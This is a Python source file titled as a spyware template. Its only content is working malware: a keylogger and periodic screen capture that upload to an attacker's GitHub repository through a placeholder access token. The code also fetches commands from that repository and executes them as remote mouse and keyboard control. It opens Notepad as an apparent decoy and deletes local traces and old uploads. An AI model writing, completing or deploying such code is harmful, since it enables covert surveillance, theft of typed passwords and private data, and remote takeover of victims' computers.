# Template: spyware_template.py

import time
import requests
from base64 import b64encode, b64decode
import os
from datetime import datetime
from PIL import ImageGrab
import subprocess
from pynput import keyboard, mouse
from pynput.keyboard import Key
import threading

# Open Notepad
subprocess.Popen(['notepad.exe'])

# --------------------------- CONFIGURATION SECTION ---------------------------
# Personal Access Token for GitHub
personal_access_token = "{GITHUB_TOKEN}"

# GitHub repository details
username = "{GITHUB_USERNAME}"
repo_name = "{GITHUB_REPO}"
branch = "main"
github_api_base_url = f"https://api.github.com/repos/{username}/{repo_name}/contents"

# Folder for screenshots and logs in the GitHub repository
screenshot_folder = "screenshots"
log_folder = "logs"
command_file_name = "commands.txt"
screenshot_folder_url = f"{github_api_base_url}/{screenshot_folder}"
log_folder_url = f"{github_api_base_url}/{log_folder}"
command_file_url = f"{github_api_base_url}/{command_file_name}"

# Authorization headers for GitHub API
headers = {
    "Authorization": f"token {personal_access_token}",
    "Accept": "application/vnd.github.v3+json",
}

# ----------------------------------------- Function to capture screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    file_name = f"Screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    file_path = os.path.join(os.getenv('TEMP'), file_name)
    screenshot.save(file_path, 'PNG')
    return file_path, file_name

# ----------------------------------------- Function to upload a file to GitHub
def upload_to_github(file_path, file_name, folder_url):
    if not os.path.exists(file_path):
        return  # Exit if the file does not exist

    with open(file_path, "rb") as file:
        content = b64encode(file.read()).decode('utf-8')

    file_url = f"{folder_url}/{file_name}"

    # First, check if the file already exists
    response = requests.get(file_url, headers=headers)

    # Prepare data for the file upload
    data = {
        "message": f"Upload: {file_name}",
        "content": content,
        "branch": branch
    }

    if response.status_code == 200:  # File exists
        existing_file = response.json()
        sha = existing_file['sha']  # Get the SHA of the existing file
        data['sha'] = sha  # Include the SHA for the existing file
        
        # Update the existing file using the PUT request
        update_response = requests.put(file_url, headers=headers, json=data)
        if update_response.status_code == 200:
            pass
    else:  # File does not exist, so we create it
        upload_response = requests.put(file_url, headers=headers, json=data)
        if upload_response.status_code == 201:
            pass

# ----------------------------------------- Function to list and delete old files from GitHub
def cleanup_old_files(folder_url, ignore_file=None):
    response = requests.get(folder_url, headers=headers)

    if response.status_code == 200:
        files = response.json()
        # Filter out files to ignore
        files = [file for file in files if file['name'].lower() != ignore_file]

        if len(files) > 1:  # Proceed only if there is more than 1 file
            # Sort files by name to identify the most recent one
            files = sorted(files, key=lambda x: x['name'])
            most_recent_file = files[-1]  # Get the most recent file
            old_files = files[:-1]  # All except the most recent one

            for file in old_files:
                sha = file['sha']
                delete_url = f"{folder_url}/{file['name']}"
                delete_data = {
                    "message": f"Cleanup: removed {file['name']}",
                    "sha": sha,
                    "branch": branch
                }
                delete_response = requests.delete(delete_url, headers=headers, json=delete_data)
                if delete_response.status_code == 200:
                    pass

# ----------------------------------------- Keylogger Functionality
def log_keys():
    log_file = os.path.join(os.getenv('TEMP'), "keylog.txt")
    
    open(log_file, 'a').close()  # Create the file if it does not exist

    def on_press(key):
        try:
            with open(log_file, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            if key == keyboard.Key.space:
                with open(log_file, "a") as f:
                    f.write(" ")
            elif key == keyboard.Key.enter:
                with open(log_file, "a") as f:
                    f.write("\n")
            else:
                with open(log_file, "a") as f:
                    f.write(f" {key} ")

    def on_release(key):
        if key == keyboard.Key.esc:
            return False  # Stop the listener

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ----------------------------------------- Function to download commands.txt from GitHub
def download_commands():
    response = requests.get(command_file_url, headers=headers)
    if response.status_code == 200:
        content = response.json()['content']
        with open(os.path.join(os.getenv('TEMP'), command_file_name), 'wb') as f:
            f.write(b64decode(content))
    else:
        pass


# Global dictionary to keep track of key states
key_states = {
    'shift': False,
    'ctrl': False,
    'alt': False,
    'capslock' : False,
    'tab' : False,
    'enter' : False
}

# ----------------------------------------- Function to execute commands
def execute_commands():
    # Download commands from GitHub
    download_commands()

    command_file_path = os.path.join(os.getenv('TEMP'), command_file_name)
    if os.path.exists(command_file_path):
        with open(command_file_path, 'r') as f:
            commands = f.readlines()
        
        mouse_controller = mouse.Controller()
        keyboard_controller = keyboard.Controller()
        
        for command in commands:
            command = command.strip()

            # Handle /click command
            if command.startswith('/click'):
                try:
                    _, button, coords = command.split(maxsplit=2)
                    x, y = map(int, coords.strip('()').split(','))
                    mouse_controller.position = (x, y)
                    if button == "left":
                        mouse_controller.click(mouse.Button.left)
                    elif button == "right":
                        mouse_controller.click(mouse.Button.right)
                except Exception as e:
                    pass
            
            elif command.startswith('/drag'):
                try:
                    _, coords = command.split(maxsplit=1)
                    start, end = coords.split()
                    x1, y1 = map(int, start.strip('()').split(','))
                    x2, y2 = map(int, end.strip('()').split(','))
                    mouse_controller.position = (x1, y1)
                    mouse_controller.press(mouse.Button.left)
                    mouse_controller.position = (x2, y2)
                    mouse_controller.release(mouse.Button.left)
                except Exception as e:
                    pass


            elif command.startswith('/sleep'):
                try:
                    _, seconds = command.split(maxsplit=1)
                    time.sleep(float(seconds))
                except Exception as e:
                    pass

            elif command.startswith('/scroll'):
                try:
                    _, direction, amount = command.split(maxsplit=2)
                    amount = int(amount)
                    if direction == 'up':
                        mouse_controller.scroll(0, amount)
                    elif direction == 'down':
                        mouse_controller.scroll(0, -amount)
                except Exception as e:
                    pass

            # Handle /type command
            elif command.startswith('/type'):
                try:
                    _, text = command.split(maxsplit=1)
                    text = text.strip('"')  # Remove quotes
                    keyboard_controller.type(text)
                except Exception as e:
                    pass

            # Handle /hold command
            elif command.startswith('/hold'):
                try:
                    _, key = command.split(maxsplit=1)
                    if key in key_states:
                        key_states[key] = True
                        if key == 'shift':
                            keyboard_controller.press(keyboard.Key.shift)
                        elif key == 'ctrl':
                            keyboard_controller.press(keyboard.Key.ctrl)
                        elif key == 'alt':
                            keyboard_controller.press(keyboard.Key.alt)
                        elif key == 'capslock':
                            keyboard_controller.press(keyboard.Key.caps_lock)
                        elif key == 'tab':
                            keyboard_controller.press(keyboard.Key.tab)
                        elif key == 'enter':
                            keyboard_controller.press(keyboard.Key.enter)
                except Exception as e:
                    pass
            
            # Handle /lift command
            elif command.startswith('/lift'):
                try:
                    _, key = command.split(maxsplit=1)
                    if key in key_states and key_states[key]:
                        key_states[key] = False
                        if key == 'shift':
                            keyboard_controller.release(keyboard.Key.shift)
                        elif key == 'ctrl':
                            keyboard_controller.release(keyboard.Key.ctrl)
                        elif key == 'alt':
                            keyboard_controller.release(keyboard.Key.alt)
                        elif key == 'capslock':
                            keyboard_controller.release(keyboard.Key.caps_lock)
                        elif key == 'tab':
                            keyboard_controller.release(keyboard.Key.tab)
                        elif key == 'enter':
                            keyboard_controller.release(keyboard.Key.enter)
                except Exception as e:
                    pass
            elif command.startswith('/shortcut'):
                try:
                    _, combo = command.split(maxsplit=1)
                    keys = combo.strip('"').split('+')
                    for key in keys:
                        if key == 'ctrl':
                            keyboard_controller.press(keyboard.Key.ctrl)
                        elif key == 'shift':
                            keyboard_controller.press(keyboard.Key.shift)
                        elif key == 'alt':
                            keyboard_controller.press(keyboard.Key.alt)
                        else:
                            keyboard_controller.press(key)
                    for key in reversed(keys):
                        if key == 'ctrl':
                            keyboard_controller.release(keyboard.Key.ctrl)
                        elif key == 'shift':
                            keyboard_controller.release(keyboard.Key.shift)
                        elif key == 'alt':
                            keyboard_controller.release(keyboard.Key.alt)
                        else:
                            keyboard_controller.release(key)
                except Exception as e:
                    pass


            elif command.startswith('/tap'):
                try:
                    _, key = command.split(maxsplit=1)
                    if hasattr(Key, key):
                        keyboard_controller.press(getattr(Key, key))
                        keyboard_controller.release(getattr(Key, key))
                    else:
                        keyboard_controller.press(key)
                        keyboard_controller.release(key)
                except Exception as e:
                    pass

        # After executing commands, delete commands.txt
        if os.path.exists(command_file_path):
            os.remove(command_file_path)
# ----------------------------------------- Main function to automate everything
def main():
    try:
        # Start the keylogger and command execution in separate threads
        keylogger_thread = threading.Thread(target=log_keys)
        keylogger_thread.daemon = True
        keylogger_thread.start()

        command_thread = threading.Thread(target=execute_commands)
        command_thread.daemon = True
        command_thread.start()

        while True:
            
            execute_commands()

            # Capture screenshot
            screenshot_path, screenshot_name = capture_screenshot()

            # Upload screenshot to GitHub
            upload_to_github(screenshot_path, screenshot_name, screenshot_folder_url)

            # Upload keylog to GitHub
            keylog_path = os.path.join(os.getenv('TEMP'), "keylog.txt")
            upload_to_github(keylog_path, "keylog.txt", log_folder_url)
            time.sleep(60)

            # After successful upload, delete the local keylog.txt file
            if os.path.exists(keylog_path):
                os.remove(keylog_path)

            # Cleanup old screenshots and logs, ignoring placeholder.txt
            cleanup_old_files(screenshot_folder_url, ignore_file='placeholder.txt')
            cleanup_old_files(log_folder_url, ignore_file='placeholder.txt')

            # Wait for 60 seconds before taking the next screenshot
            time.sleep(60)

    except Exception as e:
        pass

# ----------------------------------------- Run the main function
if __name__ == "__main__":
    main()
